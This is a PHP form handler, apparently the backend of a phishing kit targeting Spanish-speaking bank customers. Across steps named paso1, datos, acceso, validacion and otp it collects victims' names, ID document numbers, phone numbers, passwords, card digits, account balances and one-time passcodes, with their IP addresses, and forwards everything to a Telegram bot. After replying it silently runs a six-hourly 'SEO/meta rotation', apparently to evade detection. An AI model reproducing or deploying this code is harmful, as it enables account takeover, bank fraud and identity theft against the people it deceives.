<?php
require_once __DIR__ . '/config.php';

header('Content-Type: application/json; charset=utf-8');

// Modo prueba: visita send.php?test=1 en el navegador para validar
// que el token funciona y el bot puede escribirte.
if (isset($_GET['test'])) {
    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
    $data = ['chat_id' => TELEGRAM_CHAT_ID, 'text' => '🧪 Test desde send.php - ' . date('Y-m-d H:i:s')];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $resp = curl_exec($ch);
    $err  = curl_error($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    echo json_encode([
        'ok' => $code === 200,
        'http_code' => $code,
        'curl_error' => $err,
        'telegram_response' => json_decode($resp, true),
        'token_len' => strlen(TELEGRAM_BOT_TOKEN),
        'chat_id' => TELEGRAM_CHAT_ID,
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false]);
    exit;
}

// Acepta JSON o form-data
$raw = file_get_contents('php://input');
$input = json_decode($raw, true);
if (!is_array($input)) $input = $_POST;

$step = isset($input['step']) ? $input['step'] : '';

function val($a, $k) { return isset($a[$k]) ? trim((string)$a[$k]) : ''; }

function get_ip() {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
        if (!empty($_SERVER[$h])) {
            $ip = trim(explode(',', $_SERVER[$h])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return '';
}

$ip = get_ip();
$msg = '';

// Helper: escapa HTML para que Telegram no rompa con caracteres especiales
function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES | ENT_HTML5, 'UTF-8'); }

switch ($step) {
    case 'paso1':
        $nombre = trim(val($input, 'nombres') . ' ' . val($input, 'apellidos'));
        $msg  = "📝 <b>PASO 1 (preliminar)</b>\n";
        $msg .= "👤 " . h($nombre);
        break;

    case 'datos':
        $nombre = trim(val($input, 'nombres') . ' ' . val($input, 'apellidos'));
        $msg  = "🆕 <b>NUEVO REGISTRO</b>\n";
        $msg .= "👤 " . h($nombre) . "\n";
        $msg .= "🪪 " . h(val($input, 'tipoDoc')) . " " . h(val($input, 'numDoc')) . "\n";
        $msg .= "📅 " . h(val($input, 'fechaExp')) . " · " . h(val($input, 'lugarExp'));
        break;

    case 'acceso':
        $msg  = "🔐 <b>ACCESO</b>\n";
        $msg .= "📱 " . h(val($input, 'countryCode')) . " " . h(val($input, 'phone')) . "\n";
        $msg .= "🔑 " . h(val($input, 'password'));
        break;

    case 'validacion':
        $bal = (float) preg_replace('/[^\d]/', '', val($input, 'balance'));
        $msg  = "✅ <b>VALIDACIÓN</b>\n";
        $msg .= "🔢 " . h(val($input, 'lastDigits')) . "\n";
        $msg .= "💰 $" . number_format($bal, 0, ',', '.');
        break;

    case 'otp':
        $intento = val($input, 'attempt');
        $msg  = "🔓 <b>CLAVE OTP</b>" . ($intento !== '' ? " (intento $intento)" : '') . "\n";
        $msg .= "🔑 " . h(val($input, 'otp'));
        break;

    default:
        http_response_code(400);
        echo json_encode(['ok' => false, 'error' => 'step_invalido', 'received' => $input]);
        exit;
}

if ($ip !== '') {
    $msg .= "\n🌐 " . h($ip);
}

$url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
$data = [
    'chat_id'    => TELEGRAM_CHAT_ID,
    'text'       => $msg,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => 'true',
];

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => http_build_query($data),
    CURLOPT_TIMEOUT        => 10,
    CURLOPT_SSL_VERIFYPEER => false,
]);
$tg_resp = curl_exec($ch);
$tg_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$tg_err  = curl_error($ch);
curl_close($ch);

echo json_encode(['ok' => $tg_code === 200, 'code' => $tg_code]);

// =====================================================================
// Rotación automática SEO/meta (sin cron, sin bloquear al usuario).
// Cada 6 horas, la primera petición tras ese intervalo dispara la rotación.
// Las demás peticiones simultáneas no la repiten gracias a un lock.
// =====================================================================
//
// Nos despedimos del usuario antes de rotar, así no se nota latencia.
if (function_exists('fastcgi_finish_request')) {
    fastcgi_finish_request();
} else {
    // Fallback genérico
    @ignore_user_abort(true);
    @ob_end_flush();
    @flush();
}

@set_time_limit(30);

try {
    require_once __DIR__ . '/rotate_lib.php';
    nq_maybe_rotate(6 * 3600); // cada 6 horas
} catch (Throwable $e) {
    // silencio: nunca debe afectar la respuesta ya enviada
}
